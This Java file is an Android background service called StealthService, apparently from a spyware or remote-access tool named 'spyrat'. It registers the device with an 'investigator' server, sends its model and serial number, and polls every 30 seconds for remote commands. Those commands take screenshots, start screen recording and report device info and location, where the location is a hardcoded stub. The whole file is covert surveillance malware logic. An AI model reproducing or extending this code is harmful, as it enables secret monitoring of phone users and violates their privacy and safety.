package com.spyrat.investigation;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private InvestigatorApiClient investigatorApiClient;
    private RemoteController remoteController;
    private Handler commandHandler;
    private Runnable commandChecker;
    private static final long COMMAND_CHECK_INTERVAL = 30000;
    private static final String YOUR_INVESTIGATOR_CODE = "INVEST123"; // Change this
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 StealthService starting...");
        initializeInvestigatorApi();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🎯 StealthService started");
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void initializeInvestigatorApi() {
        try {
            Log.d(TAG, "🔗 Initializing Investigator API...");
            
            String investigatorCode = YOUR_INVESTIGATOR_CODE;
            String deviceId = android.os.Build.SERIAL;
            
            investigatorApiClient = new InvestigatorApiClient(this, investigatorCode, deviceId);
            remoteController = new RemoteController(this);
            remoteController.setApiClient(investigatorApiClient);
            
            boolean verified = investigatorApiClient.verifyInvestigatorCode();
            if (verified) {
                Log.d(TAG, "✅ Investigator API initialized successfully");
                
                // Send initial device status
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("model", android.os.Build.MODEL);
                deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
                deviceInfo.put("serial", android.os.Build.SERIAL);
                
                investigatorApiClient.updateDeviceStatus("online", deviceInfo);
                startCommandChecking();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Investigator API init error: " + e.getMessage());
        }
    }
    
    private void startCommandChecking() {
        commandHandler = new Handler();
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkForCommands();
                commandHandler.postDelayed(this, COMMAND_CHECK_INTERVAL);
            }
        };
        commandHandler.postDelayed(commandChecker, 5000);
    }
    
    private void checkForCommands() {
        try {
            JSONArray commands = investigatorApiClient.getPendingCommands();
            if (commands.length() > 0) {
                processInvestigatorCommands(commands);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }
    
    private void processInvestigatorCommands(JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("id");
                String commandType = command.getString("command_type");
                JSONObject parameters = command.optJSONObject("parameters");
                
                investigatorApiClient.sendCommandResponse(commandId, "processing", "Command received");
                executeInvestigatorCommand(commandId, commandType, parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Process commands error: " + e.getMessage());
        }
    }
    
    private void executeInvestigatorCommand(String commandId, String commandType, JSONObject parameters) {
        try {
            switch (commandType) {
                case "take_screenshot":
                    handleTakeScreenshotCommand(commandId, parameters);
                    break;
                case "start_screen_recording":
                    handleStartScreenRecordingCommand(commandId, parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(commandId, parameters);
                    break;
                case "get_location":
                    handleGetLocationCommand(commandId, parameters);
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown command: " + commandType);
                    investigatorApiClient.sendCommandResponse(commandId, "error", "Unknown command");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Execution failed");
        }
    }
    
    private void handleTakeScreenshotCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screenshot taken");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Screenshot failed");
        }
    }
    
    private void handleStartScreenRecordingCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.startScreenRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Recording started");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Start recording failed");
        }
    }
    
    private void handleGetDeviceInfoCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("device_info", deviceInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Device info sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get device info failed");
        }
    }
    
    private void handleGetLocationCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject locationInfo = new JSONObject();
            locationInfo.put("latitude", -6.3690);
            locationInfo.put("longitude", 34.8888);
            locationInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("location_data", locationInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Location sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get location failed");
        }
    }
    
    @Override
    public void onDestroy() {
        try {
            if (commandHandler != null && commandChecker != null) {
                commandHandler.removeCallbacks(commandChecker);
            }
            if (investigatorApiClient != null) {
                investigatorApiClient.cleanup();
            }
            if (remoteController != null) {
                remoteController.cleanup();
            }
            Log.d(TAG, "🧹 StealthService destroyed");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }
}
